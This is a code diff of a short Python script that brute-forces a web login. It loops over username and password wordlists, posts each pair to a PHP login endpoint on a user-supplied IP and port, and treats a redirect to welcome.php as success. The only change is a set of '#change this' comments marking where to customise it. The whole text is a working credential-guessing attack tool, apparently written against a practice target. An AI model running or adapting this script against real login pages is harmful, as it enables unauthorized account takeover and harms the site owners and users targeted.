@@ -1,7 +1,7 @@
 import http.client, urllib.parse
 
-username_file=open('user.txt')
-password_file=open('top_shortlist.txt')
+username_file=open('user.txt')#change this
+password_file=open('top_shortlist.txt')#change this
 host=input("Enter ip target: ")
 port=int(input("Enter target port: "))
 
@@ -14,10 +14,10 @@ for user in user_list:
         pwd=pwd.rstrip()
 
         print(user,"-",pwd)
-        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})
+        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})#change this
         headers={"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
         connection = http.client.HTTPConnection(host, port)
-        connection.request('POST','/brutforce_login/verify_login.php',post_parameters,headers)
+        connection.request('POST','/brutforce_login/verify_login.php',post_parameters,headers)#change this
         response=connection.getresponse()
 
         if(response.getheader('location')=="welcome.php"):
